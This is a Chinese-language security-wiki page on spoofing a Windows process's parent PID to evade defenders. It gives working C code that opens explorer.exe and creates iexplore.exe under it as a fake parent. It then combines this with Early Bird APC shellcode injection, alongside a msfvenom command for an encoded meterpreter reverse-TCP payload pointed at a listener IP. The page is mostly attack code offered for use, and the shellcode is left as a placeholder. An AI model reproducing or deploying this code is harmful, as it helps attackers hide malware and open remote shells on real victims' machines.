---
description: fake-PPID
---

# 伪装PPID规避检测

## UAC创建进程的过程的疑惑

> 在触发UAC时，操作系统会创建一个名为consent.exe的进程，该进程通过白名单和用户选择来确定是否提升权限。 请求进程将要提升权限的进程的commandline和程序路径通过LPC\(Local Procedure Call\)接口传递给appinfo的RAiluanchAdminProcess函数，该函数首先会验证传入程序是否在白名单内同时判断是否弹出UAC窗口，这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程。

  
  
触发UAC创建进程的过程中,我们可以知道实际上高权限的进程是由consent.exe进程创建的，但实际上父进程并非指向consent.exe任就是UAC发起者的进程ID，那么我们是否可以自己指定父进程，增加判断成本从而使蓝队脑阔疼。

![](../.gitbook/assets/image%20%2818%29.png)

![&#x7236;&#x8FDB;&#x7A0B;&#x5E76;&#x975E;consent.exe](../.gitbook/assets/image%20%2844%29.png)

## CreateProcessAsUser函数

最终创建函数的是由consent.exe调用的CreateProcessAsUser函数，那我们猜测是否是consent.exe调用时指定了某些参数，导致PPID的更换。

* 在官方文档中给出了如下原型:

```text
BOOL CreateProcessAsUserA(
  HANDLE                hToken,
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

查询官方文档得知，如果在dwCreationFlags中EXTENDED\_STARTUPINFO\_PRESENT标准，那么lpStartupInfo传入的就会是一个名为STARTUPINFOEXA的结构体，而这个结构体能指定父进程的相关信息，最终传入的PPID会被写入到新进程\_eprocess结构体的InheritedFromUniqueProcessId位置。

```text
typedef struct _STARTUPINFOEXA {
  STARTUPINFOA                 StartupInfo;
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList;
} STARTUPINFOEXA, *LPSTARTUPINFOEXA;
```

根据查询的文档,CreateProcess函数同样也支持STARTUPINFOEXA结构体。

## 伪装PPID创建iexplore.exe

* 寻找explorer.exe的pid

```text
DWORD FindExplorerPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}
```

```text
int main() {

    STARTUPINFOEXA siex = {0};
    SIZE_T Size;
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    HANDLE hFake = OpenProcess(PROCESS_ALL_ACCESS, false, FindExplorerPID());

    InitializeProcThreadAttributeList(NULL, 1, 0, &Size);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, Size);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &Size);

    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hFake, sizeof(HANDLE), NULL, NULL);
    

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&siex, NULL);
    //PS:这里有个小坑，需要开启继承句柄
    return 0;
}
```

![](../.gitbook/assets/image%20%2831%29.png)

## 与进程注入技术EARLYBIRD搭配使用

```text
#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>


DWORD FindExplorerPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

int main() {

    //msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/xor_dynamic -i 14 LHOST=192.168.0.109 EXITFUNC=thread -f
    unsigned char shellcode[] = ("XXX");


    STARTUPINFOEXA siex;
    PROCESS_INFORMATION piex;
    SIZE_T sizeT;
    siex.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, FindExplorerPID());

    InitializeProcThreadAttributeList(NULL, 1, 0, &sizeT);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, sizeT);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &sizeT);
    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);
    

    CreateProcessA("C:\\Program Files\\internet explorer\\iexplore.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOA)&siex, &piex);

    LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(piex.hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(piex.hProcess, lpBaseAddress, (LPVOID)shellcode, sizeof(shellcode), NULL);
    QueueUserAPC((PAPCFUNC)lpBaseAddress, piex.hThread, NULL);
    ResumeThread(piex.hThread);
    CloseHandle(piex.hThread);

    return 0;
}
```

![](../.gitbook/assets/image%20%2845%29.png)

![](../.gitbook/assets/image%20%2840%29.png)

![](../.gitbook/assets/image%20%2838%29.png)

* github:[https://github.com/idiotc4t/FakePPID](https://github.com/idiotc4t/FakePPID)

## LINKS

{% embed url="https://www.securitynewspaper.com/2018/04/17/new-early-bird-code-injection-technique/" %}

{% embed url="https://docs.microsoft.com/zh-cn/windows/win32/api" %}



